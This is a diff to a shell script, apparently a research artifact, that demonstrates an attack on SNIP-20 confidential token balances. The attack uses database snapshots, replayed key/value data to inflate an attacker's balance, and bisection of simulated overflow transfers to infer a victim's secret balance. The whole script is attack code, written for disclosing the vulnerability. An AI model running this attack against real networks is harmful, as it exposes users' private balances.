@@ -5,13 +5,20 @@ set -e
 source ./scripts/demo_utils.sh
 source ./scripts/local_test_params.sh
 
+attacker1=${ACC0}
+attacker2=${ACC1}
+victim=${ACC2}
+
+echo
 teebox info-panel "Artifact for Section 5.5" --title "Querying SNIP-20 account balances"
 
+echo
 teebox info-panel $'[bold]Victimo :innocent:[/]: User whose secret balance is being spied on\n[bold]Atako :rage:[/]: Attacker who can modify the untrusted code base and simulate transactions and controls two addresses' --title "Cast of Characters"
 
-teebox log "Victim (Victimo :innocent:) address=${ACC2}, balance=12343"
-teebox log "Attacker (Atako :rage:) first address=${ACC0}, balance=10000"
-teebox log "Attacker (Atako :rage:) second address=${ACC1}, balance=10000"
+echo
+teebox log "Victim (Victimo :innocent:) address=${victim}, balance=12343"
+teebox log "Attacker (Atako :rage:) first address=${attacker1}, balance=10000"
+teebox log "Attacker (Atako :rage:) second address=${attacker2}, balance=10000"
 
 CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
 CODE_HASH=$(cat $BACKUP/codeHash.txt)
@@ -23,7 +30,7 @@ teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot
 teebox log "Fork()    [light_goldenrod1]# set snapshot of database ${snapshot_uniq_label}-start[/]"
 set_snapshot "${snapshot_uniq_label}-start"
 
-# ACC2 is the victim
+# victim is the victim
 rm -f $BACKUP/victim_key
 rm -f $BACKUP/adv_key
 rm -f $BACKUP/adv_value
@@ -34,7 +41,7 @@ touch $BACKUP/adv_value
 # get boosting key and value
 teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get boosting key and value ..."
 teebox log "get boosting key and value"
-generate_and_sign_transfer $ACC1 $ACC0 1 snip20_getkey
+generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 
@@ -51,7 +58,7 @@ value=${tag:8:-1}
 teebox log "key=${key}"
 teebox log "value=${value}"
 
-# boost balance of ACC1
+# boost balance of attacker2
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
 
@@ -66,7 +73,7 @@ for i in {1..114}; do
     teebox log "amount=${amount}"
     echo
 
-    generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_boost_1
+    generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_boost_1
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
@@ -75,7 +82,7 @@ for i in {1..114}; do
     #echo $res1
 
     amount=$(echo $(python -c "print ${amount}*2"))
-    generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_2
+    generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_2
     rm -f $BACKUP/adv_key
     rm -f $BACKUP/adv_value
     touch $BACKUP/adv_key
@@ -97,7 +104,7 @@ for i in {1..114}; do
 done
 
 amount=$(echo $(python -c "print 2**128-1-${amount}"))
-generate_and_sign_transfer $ACC0 $ACC1 $amount snip20_boost_1
+generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
 cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
 cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
 
@@ -107,7 +114,7 @@ res3=$(cat $BACKUP/simulate_result)
 
 # probe victim balance
 amount=$(echo $(python -c "print 2**128-1"))
-generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_getkey
+generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
 simulate_tx snip20_getkey
@@ -121,37 +128,48 @@ value=${tag:8:-1}
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
 
-lo=0
-hi=$(echo $(python -c "print 2**128-1"))
+low=0
+#high=$(echo $(python -c "print 2**128-1"))
+high=$(bc <<< "2^128 - 1")
 cnt=0
 
-teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] probing victim's balance ..."
 
-while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
-    midv=$(echo $(python -c "print ((${hi}+${lo}+1))//2"))
-    #echo $lo $hi $midv
-    teebox log "iteration ${cnt}"
-    teebox log "lo=$lo"
-    teebox log "hi=$hi"
-    teebox log "midv=$midv"
+teebox info-panel "Through a bisection search, we simulate transactions that transfer a probe amount [bold yellow]P[/] from the attacker's account to the victim's account. A transaction succeeds if the victim's balance [bold yellow]B[/] < 2^128 - [bold yellow]P[/], and fails otherwise." --title "Probing Victim's Balance"
+
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probing victim's balance ..."
+
+while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
+#while [ $(echo $(python -c "print ${high}-${low}")) != "0" ]; do
+    probe=$(bc <<< "(${high} + ${low} + 1) / 2" )
+    teebox log "iteration=${cnt}"
+    teebox log "low=${low}"
+    teebox log "high=${high}"
+    teebox log "probe=${probe}"
 
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
     cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
     set_snapshot "${snapshot_uniq_label}-${cnt}"
     
-    generate_and_sign_transfer $ACC1 $ACC2 $midv snip20_adv
-    
+    teebox log "[bold]Simulate(Transfer(attacker, victim, probe=${probe}))[/]"
+    generate_and_sign_transfer ${attacker2} ${victim} ${probe} snip20_adv
     simulate_tx snip20_adv
-    res=$(cat $BACKUP/simulate_result)
+    simulate_tx_result=$(cat $BACKUP/simulate_result)
 
-    if [ $res != 0 ]; then
-        hi=$(echo $(python -c "print ${midv}-1"));
+    # Assumes exit code 0, meaning successful, and exit code 1, meaning failure (overflow)
+    if [ ${simulate_tx_result} != 0 ]; then
+        high=$(bc <<< "${probe} - 1");
+        teebox log "Transaction simulation [red]failed[/], [bold yellow]probe[/] is too high ([bold yellow]probe[/] + [bold yellow]B[/] >= 2^128), decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=([bold][yellow]probe[/]-1)=${high}[/]"
+        balance_floor=$(bc <<< "2^128 - ${probe}")
+        teebox log "Balance [bold yellow]B[/] >= ${balance_floor}"
     else
-        lo=$midv;
+        low=${probe};
+        teebox log "Transaction simulation [green]succeeded[/], [bold yellow]probe[/] is low enough ([bold yellow]probe[/] + [bold yellow]B[/] < 2^128), increase next [bold yellow]probe[/] amount by setting [bold]low[/]=([bold][yellow]probe[/])=${probe}[/]"
+        balance_ceiling=$(bc <<< "2^128 - ${probe}")
+        teebox log "Balance [bold yellow]B[/] < ${balance_ceiling}"
     fi
 
     cnt=$((cnt + 1))
 done
 
-balance=$(python -c "print 2**128-1-${lo}")
-teebox log "Victim (Victimo :innocent:) inferred balance=${balance}"
+balance=$(bc <<< "2^128 - 1 - ${low}")
+teebox log "Victim's :innocent: inferred balance=${balance}"
